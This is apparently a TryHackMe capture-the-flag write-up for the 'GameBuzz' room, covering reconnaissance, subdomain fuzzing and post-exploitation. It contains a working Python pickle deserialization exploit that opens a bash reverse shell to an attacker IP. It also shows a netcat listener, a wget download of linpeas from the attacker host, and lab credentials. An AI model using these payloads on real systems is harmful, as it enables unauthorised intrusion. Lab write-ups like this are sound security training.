# <div align='center'>[GameBuzz](https://tryhackme.com/room/gamebuzz)</div>
<div align='center'>Part of Incognito CTF</div>
<div align='center'>
  <img alt="gamebuzz" src="https://github.com/user-attachments/assets/b82d2e36-8800-4cd3-98a7-388c3ff47c7b" height='200'></img>
</div>

# St1p 1: Recconance

Let scan the Network:
```bash
~$ nmap -sV 10.10.41.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 16:44 IST
Nmap scan report for 10.10.41.81
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

As the only Port 80 is running let take a look

The Website seems static 
![image](https://github.com/user-attachments/assets/233e54d5-ad38-4572-920c-8182810f51e7)

There is button `game rating` when we intract with it grep a `object.pkl` file from upload folder:

![image](https://github.com/user-attachments/assets/ff0f3e68-c9f6-4271-bf66-195a225a97da)

As i scroll down i found this:

![image](https://github.com/user-attachments/assets/7dcae918-7ed8-4b87-934c-89f3f1212119)

A domain name a the bottom of the main page:`admin@incognito.com` There might be subdomain 

Let dig deeper but first add ip to hosts file
```
echo "10.10.41.81 incognito.com" | sudo tee -a /etc/hosts 
```

Lets do a subdomain brute forc to find a new domain.
```
ffuf -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -w wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -fw 8853

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://incognito.com/
 :: Wordlist         : FUZZ: /home/death/wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.incognito.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8853
________________________________________________

dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 160ms]
:: Progress: [4989/4989] :: Job [1/1] :: 230 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
we found `dev.incognito.com` let add this to host file
```
echo "10.10.41.81 dev.incognito.com" | sudo tee -a /etc/hosts 
```

Let dig more deep
```
dirsearch -u http://dev.incognito.com

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/http_dev.incognito.com/_25-06-08_13-28-55.txt

Target: http://dev.incognito.com/

[13:28:55] Starting: 
[13:29:03] 403 -  282B  - /.ht_wsr.txt
[13:29:03] 403 -  282B  - /.htaccess.orig
[13:29:03] 403 -  282B  - /.htaccess.save
[13:29:03] 403 -  282B  - /.htaccess.bak1
[13:29:03] 403 -  282B  - /.htaccess.sample
[13:29:03] 403 -  282B  - /.htaccessOLD
[13:29:03] 403 -  282B  - /.htaccessBAK
[13:29:03] 403 -  282B  - /.htaccess_sc
[13:29:03] 403 -  282B  - /.htaccess_extra
[13:29:03] 403 -  282B  - /.htaccessOLD2
[13:29:03] 403 -  282B  - /.htaccess_orig
[13:29:03] 403 -  282B  - /.htm
[13:29:04] 403 -  282B  - /.html
[13:29:04] 403 -  282B  - /.httr-oauth
[13:29:04] 403 -  282B  - /.htpasswd_test
[13:29:04] 403 -  282B  - /.htpasswds
[13:29:06] 403 -  282B  - /.php
[13:29:37] 404 -   16B  - /composer.phar
[13:29:52] 404 -   16B  - /index.php/login/
[13:30:06] 404 -   16B  - /php-cs-fixer.phar
[13:30:07] 403 -  282B  - /php5.fcgi
[13:30:09] 404 -   16B  - /phpunit.phar
[13:30:14] 200 -   32B  - /robots.txt
[13:30:15] 301 -  323B  - /secret  ->  http://dev.incognito.com/secret/
[13:30:15] 403 -  282B  - /secret/
[13:30:15] 403 -  282B  - /server-status/
[13:30:15] 403 -  282B  - /server-status

Task Completed
```
We found a `Secret` let go more deeper
```
death@esther:~$ dirsearch -u http://dev.incognito.com/secret

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/http_dev.incognito.com/_secret_25-06-08_13-30-28.txt

Target: http://dev.incognito.com/

[13:30:28] Starting: secret/
[13:31:10] 404 -   16B  - /secret/composer.phar
[13:31:24] 404 -   16B  - /secret/index.php/login/
[13:31:38] 404 -   16B  - /secret/php-cs-fixer.phar
[13:31:40] 404 -   16B  - /secret/phpunit.phar
[13:31:56] 301 -  330B  - /secret/upload  ->  http://dev.incognito.com/secret/upload/
[13:31:56] 200 -  236B  - /secret/upload/

Task Completed
```
Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload. `http://dev.incognito.com/secret/upload/`

## Step 2: Exploitation

In start we saw the request carrying this:
```
{
  "object":"/var/upload/games/object.pkl"
}
```
That mean we need to upload revser shell with `.pkl` extention

After reading some forums [learn more](https://frichetten.com/blog/escalating-deserialization-attacks-python/) I understand working of this the reverse shell crafted
```py
#!/usr/bin/env python3
import pickle, os
class pickleSerilization(object):
    def __reduce__(self):
        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/1234 0>&1'",))
pickle.dump(pickleSerilization(), open("shell", "wb"))
```

* This Python script creates a malicious `.pkl` (pickle) file that, when deserialized (loaded), will:
* Execute a reverse shell to the attacker's IP (10.xx.xx.xx) on port 1234.

Execute this script, it will create a shell file 
```
python3 test.py
```

Upload the shell on web
![image](https://github.com/user-attachments/assets/d61ef82f-9746-4631-8bfd-bb7f02d7a100)

Shell uploaded succufull 

Before executing open netcat listner in new terminal
```
nc -lnvp 1234
```
Let execute shell by going to `incognito.com` and taping on `game rate` button 
fire up burpsuite capture the request
![image](https://github.com/user-attachments/assets/852d09ce-cd83-4fd4-8885-6b930bad1a6a)

Got the connection
```
~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.41.81 35388
bash: cannot set terminal process group (1167): Inappropriate ioctl for device
bash: no job control in this shell
www-data@incognito:/$ 
```

# Step 3 : post exploitation
We have 2 user `dev1` & `dve2` we dont permission to view dev1 so move to dev2 home directory to find usefull stuff

## User flag.txt
![image](https://github.com/user-attachments/assets/a35abe66-20d3-4644-8af1-6504651f1a46)

Rather than wasting time focusing on upgrading privillage, so for that im transfering linpeas.sh form my system to this maching in /dev/shm folder using python server
```bash
www-data@incognito:/dev/shm$ wget http://10.17.14.127:8000/linpeas.sh
wget http://10.17.14.127:8000/linpeas.sh
--2025-06-08 11:42:26--  http://10.17.14.127:8000/linpeas.sh
Connecting to 10.17.14.127:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847925 (828K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  145K 5s
    50K .......... .......... .......... .......... .......... 12%  306K 4s
   100K .......... .......... .......... .......... .......... 18%  300K 3s
   150K .......... .......... .......... .......... .......... 24% 4.17M 2s
   200K .......... .......... .......... .......... .......... 30% 6.12M 2s
   250K .......... .......... .......... .......... .......... 36%  324K 1s
   300K .......... .......... .......... .......... .......... 42% 8.29M 1s
   350K .......... .......... .......... .......... .......... 48% 16.8M 1s
   400K .......... .......... .......... .......... .......... 54% 9.86M 1s
   450K .......... .......... .......... .......... .......... 60% 4.63M 1s
   500K .......... .......... .......... .......... .......... 66%  353K 1s
   550K .......... .......... .......... .......... .......... 72% 7.18M 0s
   600K .......... .......... .......... .......... .......... 78% 6.78M 0s
   650K .......... .......... .......... .......... .......... 84% 54.4M 0s
   700K .......... .......... .......... .......... .......... 90% 13.0M 0s
   750K .......... .......... .......... .......... .......... 96% 6.88M 0s
   800K .......... .......... ........                        100% 35.9M=1.0s

2025-06-08 11:42:28 (795 KB/s) - 'linpeas.sh' saved [847925/847925]

www-data@incognito:/dev/shm$ 
```
Let execute script
```
╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)
   131159      4 -rw-r--r--   1 root     mail           90 Aug 11  2021 /var/mail/dev1
   131159      4 -rw-r--r--   1 root     mail           90 Aug 11  2021 /var/spool/mail/dev1
```

Let take a look at `/var/mail/dev1`
```msg
www-data@incognito:/dev/shm$ cat /var/mail/dev1
cat /var/mail/dev1
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!
www-data@incognito:/dev/shm$ 
```
Just getting curios to take a look at source code and found this hidden file `incognito.wsgi`
```
www-data@incognito:/var$ cd mail
cd mail
www-data@incognito:/var/mail$ ls
ls
dev1
www-data@incognito:/var/mail$ cd ..
cd ..
www-data@incognito:/var$ cd www
cd www
www-data@incognito:/var/www$ ls
ls
dev.incognito.com
html
incognito.com
www-data@incognito:/var/www$ cd incognito.com
cd incognito.com
www-data@incognito:/var/www/incognito.com$ ls
ls
__pycache__
incognito
incognito.wsgi
www-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
cat incognito.wsgi
#!/usr/bin/python3
import sys
import logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/incognito.com/incognito/")

from incognito import app as application
application.secret_key = 'KeepITSecret'
www-data@incognito:/var/www/incognito.com$ 
```
We can Switch to dev2 wihout password

As the knock word in  msg , is hint of knock.conf revil by linpeas in ACLs file.
```
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
# file: /etc/knockd.conf
USER   root      rw-     
user   dev1      rw-     
GROUP  root      r--     
mask             rw-     
other            r--     

files with acls in searched folders Not Found
```
Let view this 
```
cat /etc/knockd.conf
```
Knock.conf
```
www-data@incognito:/dev/shm$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn

www-data@incognito:/dev/shm$ 
```
After some research and spending some time i understood to open port with knock 
As you can see, it has 2 port knocking sequences:

Open SSH: 5020 -> 6120 -> 7340
Close SSH: 9000 -> 8000 -> 7000
Armed with above information, we can open the SSH service by knocking port 5020, 6120, 7340:

```
knock -v 10.10.41.81 5020 6120 7340
```
